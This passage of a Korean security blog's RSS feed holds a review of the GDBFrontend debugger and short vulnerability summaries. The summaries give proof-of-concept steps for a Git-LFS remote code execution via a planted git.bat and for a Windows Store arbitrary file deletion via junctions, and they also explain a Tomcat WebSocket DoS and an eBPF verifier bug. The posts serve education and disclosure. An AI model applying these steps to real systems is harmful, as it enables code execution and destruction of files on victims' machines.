-      <content:encoded><![CDATA[<h1 id="5개월-묵힌-링크"><a href="#5개월-묵힌-링크" class="headerlink" title="5개월 묵힌 링크"></a>5개월 묵힌 링크</h1><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/1.png"></p><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/2.png"></p><p>몇 달 전 Fandu형님이 직접 사용해보고 후기를 알려달라는 말과 함께 링크를 하나 던져주셨습니다. 할 일도 묵혀둬야 제맛! 5달 동안 고이 모셔놓은 GDBFrontend, 똥인지 된장인지 찍어 먹어 봅시다.</p><h1 id="설치-및-실행"><a href="#설치-및-실행" class="headerlink" title="설치 및 실행"></a>설치 및 실행</h1><p><a href="https://github.com/rohanrhu/gdb-frontend">rohanrhu/gdb-frontend</a></p><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> &lt;https://github.com/rohanrhu/gdb-frontend.git&gt; gdb-frontend<span class="hljs-built_in">cd</span> gdb-frontend./gdbfrontend</code></pre><p>공식 github에 나와 있는 설치 방법입니다. 터미널 키시고 그대로 입력하시면 되겠습니다.</p><ol><li>GDB 8.2 이상</li><li>python3</li><li>tmux</li></ol><p>gdb-frontend를 사용하기 위한 요구사항은 3가지가 있는데, 지금 저의 환경은 Ubuntu 20.04이므로 tmux만 추가로 설치해주면 환경 세팅은 끝입니다.</p><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/3.png"></p><p>gdb-frontend를 실행시킨 후 브라우저로 <a href="http://127.0.0.1:5551/terminal/"><code>http://127.0.0.1:5551/terminal/</code></a>에  접속해주시면 됩니다. <code>-w</code> 옵션으로 working directory도 설정해 줄 수 있습니다.</p><h1 id="파이어-폭스는-나가있어"><a href="#파이어-폭스는-나가있어" class="headerlink" title="파이어 폭스는 나가있어"></a>파이어 폭스는 나가있어</h1><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/4.png"></p><p>만약 파이어폭스를 쓰고 계신다면 다른 브라우저를 사용하셔야 합니다. gdb-frontend server와의 연결이 계속 끊기길래 원인을 찾느라 시간 낭비를 좀 많이 했습니다. 자주 애용하는 gdb 플러그인 pwndbg와의 충돌이 문제라 생각해 pwndbg도 지워보고, 아예 VM을 새로 생성해 처음부터 다시 환경 구축해봤지만 결국 파폭과의 호환 문제였네요…</p><p><a href="https://github.com/rohanrhu/gdb-frontend/issues/5">tmux.conf invalid settings problem · Issue #5 · rohanrhu/gdb-frontend</a></p><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/5.png"></p><h1 id="gui-훑어보기"><a href="#gui-훑어보기" class="headerlink" title="gui 훑어보기"></a>gui 훑어보기</h1><pre><code class="hljs bash">$ ./gdbfrontend -w /home/fabu1ous/Desktop/GDBFrontend v0.3.0-gitListening on 127.0.0.1: &lt;http://127.0.0.1:5551/&gt;Open this address <span class="hljs-keyword">in</span> web browser: &lt;http://127.0.0.1:5551/terminal/&gt;</code></pre><p>브라우저로 접속한 <a href="http://127.0.0.1:5551/terminal/"><code>http://127.0.0.1:5551/terminal/</code></a>의 화면은 gdb shell이 띄워진 terminal과 gui 부분으로 나뉩니다. terminal 부분은 gdb와 다를 게 없으니 넘어가고, gui의 기본적인 구성과 기능 중 제가 써보면서 좋다고 느낀 점들을 써보겠습니다.</p><p>[ ! ] 개발자의 관점에서 디버거를 써본 적이 단 한 번도 없으니 유의하세요.</p><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/6.png"></p><p>함수 별로 assembly 코드로 출력해주며 다음에 실행될 인스트럭션은 연한 색으로 하이라이트 됩니다. 그중에서도 Call Stack 0번에 나타나는 함수의 하이라이트 된 부분은 eip (혹은 rip)입니다. 현재 프로그램 흐름의 위치를 대단히 직관적으로 알 수 있습니다. 글재주가 없어서 이렇게밖에 설명을 못 하겠네요. ㅎㅎ</p><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/7.png"></p><p>break point는 instruction의 주소를 클릭해서 생성 혹은 삭제할 수 있습니다. 좌측에 break point들의 목록을 보여주며 체크박스로 활성화 여부를 변경할 수 있습니다. 기존에 사용하던 pwndbg에서 가장 아쉬웠던 점이 바로 break point 관리가 번거롭다는 것인데, gdb-frontend는 GUI로 이 기능을 제공하니 상대적으로 좀 더 편리합니다.</p><h1 id="쓸-가치가-있는가"><a href="#쓸-가치가-있는가" class="headerlink" title="쓸 가치가 있는가?"></a>쓸 가치가 있는가?</h1><p>확장성이 좋다는 점을 내세우고 있는 만큼 설명할게 많진 않네요.</p><p>위에서 설명한 것들을 제외하면 대부분의 기능을 gdb에 의존하고 있고, 그냥 gdb만 사용하는 것과 크게 다르다는 느낌은 받지 못했습니다. gdb를 써보신 분들은 아시겠지만 gdb만을 사용해서 디버깅하는 변태는 없습니다. 적어도 해킹 씬에는 없을 거야. 메모리나 register값의 변화에 집중하며 디버깅하는 저에게 instruction 하나 실행할 때마다 <code>info reg</code> 같은 명령어를 입력하라고 한다면… 어후…</p><p>그런 점을 gdb-frontend가 개선해주진 않습니다. UI가 이쁘긴 하지만 저에게 필요한 부분은 구현이 안돼 있으니 ‘이쁜 쓰레기’라는 단어는 이럴 때 쓰는 말 이겠죠. 정작 Disassembly는 화면에 두 번이나 출력해줍니다. ㅎㅎ</p><blockquote><p>L0ch 曰 : 이쁜 쓰레기네 이쁜 쓰레기</p></blockquote><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/8.png"></p><p>gdb-frontend로 CTF문제 하나 풀고, 연구 글을 가장한 write-up을 작성하려 했지만 도저히 gdb-frontend만으로 문제를 풀 순 없을 거 같네요. 그래서 일말의 희망을 갖고 pwndbg와 연동해봤습니다만, gdb-frontend는 주객전도를 허용하지 않습니다. gdb-frontend의 ui가 없어질 정도로 terminal의 크기를 키워야 하고,</p><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/9.png"></p><p>무엇보다 gdb-frontend가 뻗어버립니다. 일단 제가 사용하면서 crash 나는 상황은 2가지 있었습니다.</p><ol><li>분석하고 있는 프로세스가 segmentation fault를 일으킬 때</li><li>존재하는 프로세스에 attach 할 때</li></ol><p>저에겐 이 두 가지 상황 모두 매우 큰 단점입니다. python exploit 코드에 따라 동작하고 있는 프로세스에 gdb를 attach 해 분석하는 것이 주된 사용방법인데, 그게 안된다니요… 그리고 segmentation fault에 대한 어떠한 정보도 얻을 수 없으니 취약점 찾는 입장에선 화딱지가 안 날 수가 없습니다.</p><h1 id="마무리"><a href="#마무리" class="headerlink" title="마무리"></a>마무리</h1><ol><li>gdb의 기능을 gui로 사용할 수 있다? <strong>No</strong><ul><li>결국 모든 동작은 gdb terminal을 통해 이루어짐.</li><li>gui로 gdb를 다루는 것이 아니라, gdb의 결괏값을 gui로 보여주는 플러그인</li><li>chrome으로 gdb를 사용하는 거라 오히려 불편함</li></ul></li><li>pwnable에 사용할 수 있다? <strong>No</strong></li></ol>]]></content:encoded>
-      
-      
-      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
-      
-      
-      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/gdb-frontend/">gdb-frontend</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/pwndbg/">pwndbg</category>
-      
-      
-      <comments>https://hackyboiz.github.io/2020/11/08/fabu1ous/gdb-frontend-review/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>[하루한줄] CVE-2020-27955: Git-LFS RCE Exploit</title>
-      <link>https://hackyboiz.github.io/2020/11/06/l0ch/2020-11-06/</link>
-      <guid>https://hackyboiz.github.io/2020/11/06/l0ch/2020-11-06/</guid>
-      <pubDate>Fri, 06 Nov 2020 09:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://exploitbox.io/vuln/Git-Git-LFS-RCE-Exploit-CVE-20</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://exploitbox.io/vuln/Git-Git-LFS-RCE-Exploit-CVE-2020-27955.html">Git-LFS RCE Exploit CVE-2020-27955</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Git &lt;= 2.29.2-git-lfs</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>대용량 파일을 업로드 하기 위해 github에서 개발한 extension인 git-lfs(Large File Storage)에서 Windows를 대상으로 원격 코드 실행이 가능한 취약점이 발견되었습니다.</p><p>해당 취약점을 악용하여 git-lfs로 업로드한 파일이 있는 저장소에서 Windows 시스템의 피해자가 저장소를 복제할 때 상호작용 없이 공격자의 악성 바이너리가 실행될 수 있습니다.</p><p>취약점의 PoC는 아래와 같습니다.</p><ol><li><p>공격자는 저장소에 실행할 명령어를 포함한 <code>git.*</code> 이름의 windows 바이너리 형식 파일을 추가합니다.</p><pre><code class="hljs bash">git.bat : @<span class="hljs-built_in">echo</span> git-lfs RCE exploit!!git add git.bat</code></pre></li><li><p>저장소에 lfs 파일을 추가합니다.</p><pre><code class="hljs bash">git lfs track <span class="hljs-string">&quot;* .dat&quot;</span> git add .gitattributes<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;git exploit PoC&quot;</span>&gt; lfs.datgit add lfs.dat</code></pre></li><li><p>바이너리와 lfs 파일을 커밋하고 원격 저장소에 업로드합니다.</p><pre><code class="hljs bash">git commit -a -m <span class="hljs-string">&quot;git-lfs exploit&quot;</span>git remote add origin https://repository_urlgit push -u origin master</code></pre></li><li><p>Windows 시스템에서 clone할 때 git-lfs 취약점이 트리거되어 기존 git 바이너리 대신 공격자의 원격 저장소에서 clone한 악성 <code>git.bat</code>이 사용자 상호작용 없이 실행됩니다.</p><pre><code class="hljs bash">PowerShell&gt; git <span class="hljs-built_in">clone</span> https://repository_urlgit-lfs RCE exploit!!</code></pre></li></ol>]]></content:encoded>
-      
-      
-      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
-      
-      
-      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/git/">git</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/git-lfs/">git lfs</category>
-      
-      
-      <comments>https://hackyboiz.github.io/2020/11/06/l0ch/2020-11-06/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>[하루한줄] CVE-2020-13935: Apache Tomcat Websocket 취약점</title>
-      <link>https://hackyboiz.github.io/2020/11/05/idioth/2020-11-05/</link>
-      <guid>https://hackyboiz.github.io/2020/11/05/idioth/2020-11-05/</guid>
-      <pubDate>Thu, 05 Nov 2020 09:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.redteam-pentesting.de/2020/websocket-vulnera</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.redteam-pentesting.de/2020/websocket-vulnerability-tomcat/">DIVING INTO A WEBSOCKET VULNERABILITY IN APACHE TOMCAT</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Apache Tomcat<ul><li>10.0.0-M1 ~ 10.0.0-M6</li><li>9.0.0.M1 ~ 9.0.36</li><li>8.5.0 ~ 8.5.56</li><li>7.0.27 ~ 7.0.104</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>해당 취약점은 Apache Tomcat의 WebSocket 프레임에서 <code>payloadLength</code>에 의해 무한 루프가 트리거 되어 DoS 공격으로 연결될 수 있는 취약점입니다.</p><p><a href="https://tools.ietf.org/html/rfc6455#section-5.2">RFC6455</a>의 WebSocket 프레임에서 payload length 필드가 127(2진수 1111111)이면 64비트 확장 payload length를 사용합니다. 이 payload length는 64비트 unsigned integer이지만 RFC에서는 최상위 비트가 항상 0이 되도록 요구합니다.</p><p>따라서 payload length 필드를 127로 설정해준 후 다음 8바이트의 MSB를 1로 설정해주기만 하면 DoS 공격을 수행할 수 있습니다.</p><p>취약점과 관련된 패치는 <code>payloadLength</code>가 음수가 될 경우 exception을 발생시키도록 패치되었습니다.</p><pre><code class="hljs java"><span class="hljs-comment">// The most significant bit of those 8 bytes is required to be zero</span><span class="hljs-comment">// (see RFC 6455, section 5.2). If the most significant bit is set,</span><span class="hljs-comment">// the resulting payload length will be negative so test for that.</span><span class="hljs-keyword">if</span> (payloadLength &lt; <span class="hljs-number">0</span>) &#123;    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> WsIOException(        <span class="hljs-keyword">new</span> CloseReason(            CloseCodes.PROTOCOL_ERROR,            sm.getString(<span class="hljs-string">&quot;wsFrame.payloadMsbInvalid&quot;</span>)        )    );&#125;</code></pre><p>해당 취약점에 관한 PoC Code는 <a href="https://github.com/RedTeamPentesting/CVE-2020-13935">여기</a>서 확인할 수 있습니다.</p>]]></content:encoded>
-      
-      
-      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
-      
-      
-      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/apache/">apache</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/tomcat/">tomcat</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/websocket/">websocket</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/dos/">dos</category>
-      
-      
-      <comments>https://hackyboiz.github.io/2020/11/05/idioth/2020-11-05/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>[하루한줄] CVE-2020-27194: eBPF verifier bug</title>
-      <link>https://hackyboiz.github.io/2020/11/04/fabu1ous/2020-11-04/</link>
-      <guid>https://hackyboiz.github.io/2020/11/04/fabu1ous/2020-11-04/</guid>
-      <pubDate>Wed, 04 Nov 2020 09:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://scannell.me/fuzzing-for-ebpf-jit-bugs-in-the-linu</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://scannell.me/fuzzing-for-ebpf-jit-bugs-in-the-linux-kernel/">Fuzzing for eBPF JIT bugs in the Linux kernel</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Linux kernel</p><p>eBPF</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>eBPF는 런타임 중 안전하게 커널 코드를 삽입하기 위해 Verifier와 BPF instruction을 사용합니다. Verifier는 레지스터의 값의 변화와 그 값들의 허용 범위(이하 range)등을 트래킹해  memory load와 store의 out-of-bound 여부를 검사하며,  32-bit와 64-bit 각각의 range를 구분해 관리합니다. OR연산이 끝난 후 그에 맞게  32-bit 레지스터의 range를 업데이트하는 <code>scalar32_min_max_or()</code>함수는 이 구분이 확실하지 못하고, 버그를 유발합니다.</p><pre><code class="hljs c"><span class="hljs-comment">/* ORing two positives gives a positive, so safe to</span><span class="hljs-comment">* cast result into s64.</span><span class="hljs-comment">*/</span>dst_reg-&gt;s32_min_value = dst_reg-&gt;umin_value;dst_reg-&gt;s32_max_value = dst_reg-&gt;umax_value;</code></pre><p>64-bit range를 32-bit range로 casting 하는 <code>scalar32_min_max_or()</code>의 코드 부분입니다. Verifier는 <code>s32_min_value</code>와 <code>s32_max_value</code>를 이용해 range를 트래킹 하는데, 만약 이 두 값이 같다면 레지스터 값을 상수로 인식하고 그에 따라 코드가 분기합니다. </p><p>만약 위 코드에서 <code>dst_reg-&gt;umin_value</code>가 1이고, <code>dst_reg-&gt;umax_value</code>가 25769803777이라면 <code>dst_reg-&gt;s32_min_value</code>와 <code>dst_reg-&gt;s32_max_value</code> 둘 다 1로 저장되어 레지스터를 range가 아닌 상수로 인식하게 됩니다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.sosconhistory.net/soscon2018/pdf/day2_1100_3.pdf">https://www.sosconhistory.net/soscon2018/pdf/day2_1100_3.pdf</a></p>]]></content:encoded>
-      
-      
-      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
-      
-      
-      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/linux/">linux</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/kernel/">kernel</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/ebpf/">ebpf</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/bpf/">bpf</category>
-      
-      
-      <comments>https://hackyboiz.github.io/2020/11/04/fabu1ous/2020-11-04/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>[하루한줄] CVE-2020-16877: Exploiting Microsoft Store Games</title>
-      <link>https://hackyboiz.github.io/2020/11/03/l0ch/11-03_1day1line/</link>
-      <guid>https://hackyboiz.github.io/2020/11/03/l0ch/11-03_1day1line/</guid>
-      <pubDate>Tue, 03 Nov 2020 09:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://labs.ioactive.com/2020/11/cve-2020-16877-exploiti</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://labs.ioactive.com/2020/11/cve-2020-16877-exploiting-microsoft.html">CVE-2020-16877: Exploiting Microsoft Store Games</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows 10 - Microsoft Store</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft Store에서 배포하는 UWP(Universal Windows platform) 앱은 일반적으로  <code>C:\Program Files\WindowsApps</code> 디렉터리에 저장되어 일반적인 권한으로 접근할 수 없으며 Appx라는 형식의 파일을 앱 설치 관리자 프로그램을 통해서만 설치/제거가 가능합니다. </p><p>지난 6월 Microsoft는 게임 앱의 모드를 지원하기 위해 수정이 가능한 Windows 앱을 호스팅 하는 디렉터리인 <code>C:\ProgramFiles\ModifiableWindowsApps</code>을 추가했는데, 이 기능에 심볼릭 링크를 사용해 arbitrary file deletion 취약점이 발견되었습니다.</p><p>PoC는 아래와 같습니다.</p><ol><li>다른 시스템 드라이브 <code>D:\</code>에 pivot 할 경로를 생성하고 windows 저장소 설정을 통해 기본 저장 위치를 <code>D:\</code> 로 변경합니다</li></ol><pre><code class="hljs powershell"><span class="hljs-built_in">md</span> <span class="hljs-string">&quot;D :\Program Files&quot;</span><span class="hljs-built_in">md</span> <span class="hljs-string">&quot;D :\pivot&quot;</span></code></pre><ol start="2"><li><p>Microsoft Store에서 모드 지원이 되는 게임 앱을 받아 설치하면 <code>D:\Program Files\ModifiableWindowsApps</code> 하위에 해당 앱의 디렉터리가 생성됩니다.</p></li><li><p>이중 심볼릭 링크를 생성해 앱의 디렉터리가 심볼릭 링크의 교차점이 되도록 만들고, 심볼릭 링크로 리디렉션 할 최종 디렉터리는 삭제할 시스템 권한의 디렉터리로 설정합니다.</p></li></ol><pre><code class="hljs powershell">mklink / J <span class="hljs-string">&quot;D:\Program Files\ModifiableWindowsApps&quot;</span> <span class="hljs-string">&quot;D:\pivot&quot;</span>mklink / J <span class="hljs-string">&quot;D:\pivot\Game_App&quot;</span> <span class="hljs-string">&quot;C:\arbitrary_path\to_delete&quot;</span></code></pre><ol start="4"><li>앱을 삭제하면 이중 심볼릭 링크로 인해 시스템 권한으로 임의 경로의 파일이 삭제됩니다.</li></ol><p>작성자는 시스템 권한의 쉘을 실행하는 데모 영상 또한 공개했습니다.</p>]]></content:encoded>
-      
-      
-      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
-      
-      
-      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/eop/">eop</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/arbitrary-file-deletion/">arbitrary file deletion</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/microsoft-store/">microsoft store</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/symbolic-link/">symbolic link</category>
-      
-      
-      <comments>https://hackyboiz.github.io/2020/11/03/l0ch/11-03_1day1line/#disqus_thread</comments>
       
     </item>
     
